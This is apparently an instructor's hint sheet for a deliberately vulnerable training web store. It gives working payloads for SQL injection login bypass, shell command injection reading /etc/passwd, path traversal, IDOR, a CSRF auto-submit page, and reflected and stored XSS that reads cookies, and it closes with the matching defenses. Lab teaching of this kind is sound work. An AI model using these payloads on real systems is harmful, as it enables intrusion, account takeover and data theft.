# Instructor Hint Sheet — Majal Store

**Do not give this to students.** Hand out hints one line at a time when someone
stalls. Every payload below is verified against the running app. Replace `LAB`
with the VM address (e.g. `http://majal-lab` or `http://100.x.y.z`).

Suggested order — it forms one chain: SQLi gets you admin → admin unlocks the
network tool → command injection gives a shell → from there, or via the receipt
link, path traversal reads the FLAG.

---

## 1. SQL Injection — login form (`/login`)

- **Nudge:** "The login builds a sentence out of what you type. What if your
  username *is* punctuation?"
- **Bypass (log in as the first user = admin):**
  - Username: `admin'-- ` (trailing space) — or `admin'-- -`
  - Password: anything
- **Auth bypass without knowing any name:**
  - Username: `' OR '1'='1'-- `
- **Why:** `SELECT * FROM users WHERE username = '<u>' AND password = '<p>'`
  with values pasted in. `--` comments out the password check.
- **Bonus:** the search box (`/?q=`) is the same string-built query — a `'`
  there throws a visible SQL error (also union-injectable).

## 2. Command Injection — Network Tools (`/admin`, admins only)

- **Get there first** by logging in as admin via #1. Non-admins get 403.
- **Nudge:** "It really runs `ping`. The shell reads `;` and `&&` too."
- **Payloads** (Host field):
  - `127.0.0.1; id` → runs as `shopuser` (uid 10001, inside the container)
  - `127.0.0.1; ls -la ..`
  - `127.0.0.1; cat ../FLAG.txt`
  - `127.0.0.1 && cat /etc/passwd`
- **Why:** `os` runs `"ping -c 1 " + host` through the shell.
- Reinforce: the shell is the *container's*, non-root — that's the guard rail,
  not an accident.

## 3. Path Traversal — receipt download (`/receipt?file=`)

- **Nudge:** "The receipt link passes a filename in the URL. Filenames can point
  *up*."
- Any logged-in user (grab a student login) can hit:
  - `LAB/receipt?file=../FLAG.txt` → `MAJAL{...}`
  - `LAB/receipt?file=../../../../../../etc/passwd`
- **Why:** the filename is joined onto the receipts folder with no check, so
  `../` walks out of it.

## 4. IDOR — order pages (`/order/<id>`)

- **Nudge:** "Your order is `/order/…` with a number. What else is a number?"
- Log in as `student01` / `majal01`, view your order, then change the id in the
  URL: `LAB/order/1`, `LAB/order/2`, … You'll read **other customers' orders**
  (names, items, totals) — e.g. Maha Al-Faisal's.
- **Why:** the app fetches the order by id and never checks it belongs to you.

## 5. CSRF — change account email (`/account/email?to=`)

- **Nudge:** "Changing your email is just a GET with your cookie. Another page
  could make your browser send it."
- Victim is logged in (any student). Serve them this page (open it in the same
  browser to demo):
  ```html
  <!-- attacker.html -->
  <h1>Win a Falcon Pro Drone!</h1>
  <form action="http://LAB/account/email" method="get">
    <input type="hidden" name="to" value="attacker@evil.com">
  </form>
  <script>document.forms[0].submit();</script>
  ```
- The victim's email silently changes to the attacker's (account-takeover
  primer: next step would be password reset).
- **Why:** state-changing request, no CSRF token, authenticated only by the
  cookie. It's a top-level GET navigation, so the `Lax` cookie rides along.
- **Live demo tip:** open the victim's account page before and after to show the
  email flip.

## 6. Reflected XSS — search (`/?q=`)

- **Nudge:** "Search for something, then look at where your words show up."
- `LAB/?q=<script>alert(document.domain)</script>`
- `LAB/?q=<img src=x onerror=alert(1)>`
- **Why:** the search term is echoed back into the results line unescaped.
- The payload only fires for the person who clicks the crafted link (contrast
  with #7).

## 7. Stored XSS — product reviews (`/product/<id>`)

- **Nudge:** "Reviews show up for *everyone* who opens the product. What if a
  review were code?"
- On any product, post a review with body:
  - `<script>alert(document.cookie)</script>`
  - `<img src=x onerror="alert('XSS by '+document.cookie)">`
- **The moment:** have every student open the same product. One student's payload
  fires in all their browsers. Point the whole class at product #1 and let
  someone plant it.
- **Why:** the review body is stored raw and rendered unescaped for every viewer.
- Cookies are readable (`HTTPOnly` is deliberately off) so `document.cookie`
  exfil is on the table for a keener group.

---

## Running the room

- **Projector:** `docker logs -f majal-lab` — you'll see their `;id`, their
  `../etc/passwd`, their `<script>` in the access log. Narrate it.
- **When the box misbehaves:** `./reset.sh` (or wait for the 10-min cron). Tell
  them up front: "the box heals on the 10s — if it breaks, it's back in seconds."
- **Griefing:** a student who finishes early and spams stored XSS is *doing the
  lesson*. The reset covers you; turn it into "notice how one review broke the
  page for all of you — that's the vulnerability."
- **Defenses (the close):** parameterised queries (#1), `subprocess` with an
  argument list + no shell (#2), `os.path.basename` / allowlist (#3), an
  ownership check (#4), a CSRF token + `SameSite=Strict` (#5), output encoding /
  autoescaping (#6, #7). These are the "four defensive habits" slide made concrete.
